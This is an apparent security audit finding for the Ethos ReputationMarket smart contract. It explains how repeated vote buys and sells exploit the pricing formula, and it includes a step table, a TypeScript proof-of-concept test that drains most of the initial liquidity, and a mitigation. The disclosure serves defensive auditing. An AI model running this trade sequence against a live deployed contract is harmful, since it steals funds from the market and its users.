# Arbitrage attackers can steal funds from the reputation market.

# Arbitrage attackers can steal funds from the reputation market.

### Summary

There is no cool down period between the buying and selling the votes and users can buy and sell continuously in one transaction.
When users buy or sells votes, the vote price is changed according to `price = (votes * basePrice) / totalVotes`.
As a result, there is arbitrage opportunity and attackers can steal funds using this vulnerability.

### Root Cause

In the `ReputationMarket._calcVotePrice` function, it calculates the vote price as `price = (votes * basePrice) / totalVotes` from [L922](https://github.com/sherlock-audit/2024-11-ethos-network-ii/tree/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L922)

```solidity
  function _calcVotePrice(Market memory market, bool isPositive) private pure returns (uint256) {
    uint256 totalVotes = market.votes[TRUST] + market.votes[DISTRUST];
    return (market.votes[isPositive ? TRUST : DISTRUST] * market.basePrice) / totalVotes; //zz ?
  }
```

And users can buy and sell votes continuously in one transaction [here](https://github.com/sherlock-audit/2024-11-ethos-network-ii/tree/main/ethos/packages/contracts/contracts/ReputationMarket.sol#L442-L500).

### Attack Path

Let's consider the following scenario:

- Alice creates the market with `0.01 ether` initial liquidity.
- Bob buys and sells according to the following steps:

| buy/sell | isPositive | trust | distrust | votes / totalVotes |
| -------- | ---------- | ----- | -------- | ------------------ |
|  |  | 1 | 1 | |
| buy  | true  | 2 | 1 | + 1 / 2 |
| buy  | false | 2 | 2 | + 1 / 3 |
| buy  | true  | 3 | 2 | + 1 / 2 |
| buy  | false | 3 | 3 | + 2 / 5 |
| buy  | true  | 4 | 3 | + 1 / 2 |
| sell | false | 4 | 2 | - 2 / 6 |
| sell | false | 4 | 1 | - 1 / 5 |
| sell | true  | 3 | 1 | - 3 / 4 |
| sell | true  | 2 | 1 | - 2 / 3 |
| sell | true  | 1 | 1 | - 1 / 2 |
| final |      |   |   | -13 / 60 |

As a result, bob receives `0.01 * 13 / 60` ethers.

For the simplicity, this scenario uses the market which has initial liquidity.
Arbitrage attacking is also available in the general status.

### Impact

- Malicious attackers can steal funds of the market.
- This can break the following requirement in README:

"""
Reputation Markets must never sell the initial votes. They must never pay out the initial liquidity deposited. The only way to access those funds is to graduate the market.
"""

### PoC

Add the following test codes in the `rep.market.test.ts` file.

```ts
  it('arbitrage_test', async () => {
    const {trustVotes: trustVotes1, distrustVotes: distrustVotes1, balance:balance1} = await userB.getVotes();
    console.log(trustVotes1, distrustVotes1, balance1);
    for (let i = 0; i < 9; i++){
      await userB.buyOneVote({isPositive: true,});
      await userB.buyOneVote({isPositive: false,});
      await userB.buyOneVote({isPositive: true,});
      await userB.buyOneVote({isPositive: false,});
      await userB.buyOneVote({isPositive: true,});
      await userB.sellOneVote({isPositive: false,});
      await userB.sellOneVote({isPositive: false,});
      await userB.sellOneVote({isPositive: true,});
      await userB.sellOneVote({isPositive: true,});
      await userB.sellOneVote({isPositive: true,});
    }
    const {trustVotes: trustVotes2, distrustVotes: distrustVotes2, balance:balance2} = await userB.getVotes();
    console.log(trustVotes2, distrustVotes2, balance2);
  });
```

The test result is following as:

```bash
0n 0n 2000000000000000000000n
0n 0n 2000008093015095095392n
```

Initially, there is 0.01 eth in the market and `userB` steals `8093015095095392`(0.008 eth).

### Mitigation

Improve the votes price mechanism and add the cool down period between the buying and selling votes.
